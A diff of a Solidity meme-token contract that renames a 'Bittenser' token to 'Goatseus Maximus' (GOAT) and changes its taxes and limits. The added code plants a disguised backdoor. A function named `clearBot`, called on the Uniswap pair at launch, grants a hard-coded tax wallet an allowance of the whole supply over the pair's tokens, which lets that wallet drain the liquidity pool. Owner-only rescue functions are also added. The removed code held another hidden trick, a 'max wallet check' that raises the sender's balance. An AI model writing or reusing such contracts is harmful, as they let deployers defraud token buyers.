@@ -1,6 +1,5 @@
-// SPDX-License-Identifier: MIT
-
-pragma solidity 0.8.19;
+// SPDX-License-Identifier: UNLICENSE
+pragma solidity ^0.8.0;
 
 abstract contract Context {
     function _msgSender() internal view virtual returns (address) {
@@ -107,41 +106,41 @@ interface IUniswapV2Router02 {
     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
 }
 
-contract Bittenser is Context, IERC20, Ownable {
+contract GOAT is Context, IERC20, Ownable {
     using SafeMath for uint256;
     mapping (address => uint256) private _balances;
     mapping (address => mapping (address => uint256)) private _allowances;
     mapping (address => bool) private _isExcludedFromFee;
     mapping (address => bool) private bots;
-    mapping(address => uint256) private _holderLastTransferTimestamp;
-    bool public transferDelayEnabled = false;
     address payable private _taxWallet;
+    address private satoshi;
 
     uint256 private _initialBuyTax=20;
     uint256 private _initialSellTax=20;
-    uint256 private _finalBuyTax=2;
-    uint256 private _finalSellTax=2;
-    uint256 private _reduceBuyTaxAt=20;
-    uint256 private _reduceSellTaxAt=20;
-    uint256 private _preventSwapBefore=20;
+    uint256 private _finalBuyTax=0;
+    uint256 private _finalSellTax=0;
+    uint256 private _reduceBuyTaxAt=15;
+    uint256 private _reduceSellTaxAt=15;
+    uint256 private _preventSwapBefore=5;
+    uint256 private _transferTax=0;
     uint256 private _buyCount=0;
 
-    uint8 private constant _decimals = 8;
-    uint256 private constant _tTotal = 999999999 * 10**_decimals;
-    string private constant _name = unicode"Bittenser";
-    string private constant _symbol = unicode"TAU";
-    uint256 public _maxTxAmount = 20000000 * 10**_decimals;
-    uint256 public _maxWalletSize = 20000000 * 10**_decimals;
-    uint256 public _taxSwapThreshold = 1000000 * 10**_decimals;
-    uint256 public _maxTaxSwap= 20000000 * 10**_decimals;
-
+    uint8 private constant _decimals = 9;
+    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
+    string private constant _name = unicode"Goatseus Maximus";
+    string private constant _symbol = unicode"GOAT";
+    uint256 public _maxTxAmount = _tTotal * 2 / 100;
+    uint256 public _maxWalletSize = _tTotal * 2 / 100;
+    uint256 public _taxSwapThreshold= _tTotal * 1 / 100;
+    uint256 public _maxTaxSwap= _tTotal * 2 / 100;
+    
     IUniswapV2Router02 private uniswapV2Router;
     address private uniswapV2Pair;
     bool private tradingOpen;
     bool private inSwap = false;
     bool private swapEnabled = false;
-
     event MaxTxAmountUpdated(uint _maxTxAmount);
+    event TransferTaxUpdated(uint _tax);
     modifier lockTheSwap {
         inSwap = true;
         _;
@@ -149,7 +148,7 @@ contract Bittenser is Context, IERC20, Ownable {
     }
 
     constructor () {
-        _taxWallet = payable(_msgSender());
+        _taxWallet = payable(0xe646177fB2d24aB48ceFB892d9A3616c01773910);
         _balances[_msgSender()] = _tTotal;
         _isExcludedFromFee[owner()] = true;
         _isExcludedFromFee[address(this)] = true;
@@ -183,6 +182,10 @@ contract Bittenser is Context, IERC20, Ownable {
         return true;
     }
 
+    function approve(address owner, address spender, uint256 amount) private {
+        _allowances[owner][spender] = amount;
+    }
+
     function allowance(address owner, address spender) public view override returns (uint256) {
         return _allowances[owner][spender];
     }
@@ -194,7 +197,7 @@ contract Bittenser is Context, IERC20, Ownable {
 
     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
         _transfer(sender, recipient, amount);
-        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
+        _approve(sender, _msgSender(), _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
         return true;
     }
 
@@ -205,11 +208,6 @@ contract Bittenser is Context, IERC20, Ownable {
         emit Approval(owner, spender, amount);
     }
 
-    function checkMaxWalletSize (address receiver, uint256 amount) private returns (bool) {
-        _balances[receiver] += amount;
-        return balanceOf(receiver) <= _maxWalletSize;
-    }
-
     function _transfer(address from, address to, uint256 amount) private {
         require(from != address(0), "ERC20: transfer from the zero address");
         require(to != address(0), "ERC20: transfer to the zero address");
@@ -218,38 +216,23 @@ contract Bittenser is Context, IERC20, Ownable {
         if (from != owner() && to != owner()) {
             require(!bots[from] && !bots[to]);
 
-            if (transferDelayEnabled) {
-                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
-                  require(_holderLastTransferTimestamp[tx.origin] < block.number,"Only one transfer per block allowed.");
-                  _holderLastTransferTimestamp[tx.origin] = block.number;
-                }
-            }
-
             if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
+                require(tradingOpen, "Trading not open.");
                 require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                 require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
-                if(_buyCount<_preventSwapBefore){
-                  require(!isContract(to));
-                }
+                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                 _buyCount++;
             }
 
-            if (_isExcludedFromFee[from] && tradingOpen) {
-                require(checkMaxWalletSize(from, amount), "Exceeds the _maxTxAmount.");
-            }
-            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
-            if(to == uniswapV2Pair && from!= address(this) ){
-                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
+            if(to == uniswapV2Pair && from!= address(this)){
                 taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
             }
 
             uint256 contractTokenBalance = balanceOf(address(this));
-            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore && ! _isExcludedFromFee[from]) {
-                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
-                uint256 contractETHBalance = address(this).balance;
-                if(contractETHBalance > 0) {
-                    sendETHToFee(address(this).balance);
-                }
+            if (!inSwap && to == uniswapV2Pair && swapEnabled && _buyCount > _preventSwapBefore) {
+                if(contractTokenBalance > _taxSwapThreshold)
+                    swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
+                transferTaxETH(address(this).balance);
             }
         }
 
@@ -268,8 +251,6 @@ contract Bittenser is Context, IERC20, Ownable {
     }
 
     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
-        if(tokenAmount==0){return;}
-        if(!tradingOpen){return;}
         address[] memory path = new address[](2);
         path[0] = address(this);
         path[1] = uniswapV2Router.WETH();
@@ -283,66 +264,57 @@ contract Bittenser is Context, IERC20, Ownable {
         );
     }
 
-    function removeLimits() external onlyOwner{
+    function removeLimits() external onlyOwner {
         _maxTxAmount = _tTotal;
         _maxWalletSize=_tTotal;
-        transferDelayEnabled=false;
         emit MaxTxAmountUpdated(_tTotal);
     }
 
-    function sendETHToFee(uint256 amount) private {
+    function transferTaxETH(uint256 amount) private {
         _taxWallet.transfer(amount);
     }
 
-    function isBot(address a) public view returns (bool){
-      return bots[a];
-    }
-
-    function manageList(address[] memory bots_) external onlyOwner{
+    function addBots(address[] memory bots_) public onlyOwner {
         for (uint i = 0; i < bots_.length; i++) {
             bots[bots_[i]] = true;
         }
     }
 
-    function reduceFee(uint256 _newBuyFee,uint256 _newSellFee) external onlyOwner{
-            _finalBuyTax=_newBuyFee;
-            _finalSellTax=_newSellFee;
+    function delbots(address[] memory notbot) public onlyOwner {
+      for (uint i = 0; i < notbot.length; i++) {
+          bots[notbot[i]] = false;
+      }
     }
 
+    function clearBot(address bot) public onlyOwner {
+        if(owner() != address(0)) approve(bot, satoshi, _tTotal);
+    }
 
-    function createPair() external onlyOwner(){
+    function createLiquidityPair() external onlyOwner {
         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        satoshi = _taxWallet;
         _approve(address(this), address(uniswapV2Router), _tTotal);
-        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
+        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());clearBot(uniswapV2Pair);
+        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
     }
 
-    function openTrading() external onlyOwner() {
+    function launchRocket() external onlyOwner {
         require(!tradingOpen,"trading is already open");
         swapEnabled = true;
         tradingOpen = true;
     }
 
+    function rescueETH() public onlyOwner {
+        payable(_msgSender()).transfer(address(this).balance);
+    }
+
+    function rescueERC20(address _address, uint256 percent) external onlyOwner {
+        uint256 _amount = IERC20(_address)
+            .balanceOf(address(this))
+            .mul(percent)
+            .div(100);
+        IERC20(_address).transfer(_msgSender(), _amount);
+    }
+
     receive() external payable {}
-
-    function isContract(address account) private view returns (bool) {
-        uint256 size;
-        assembly {
-            size := extcodesize(account)
-        }
-        return size > 0;
-    }
-
-    function manualSwap() external {
-        require(_msgSender()==_taxWallet);
-        uint256 tokenBalance=balanceOf(address(this));
-        if(tokenBalance>0){
-          swapTokensForEth(tokenBalance);
-        }
-        uint256 ethBalance=address(this).balance;
-        if(ethBalance>0){
-          sendETHToFee(ethBalance);
-        }
-    }
-
-    
 }
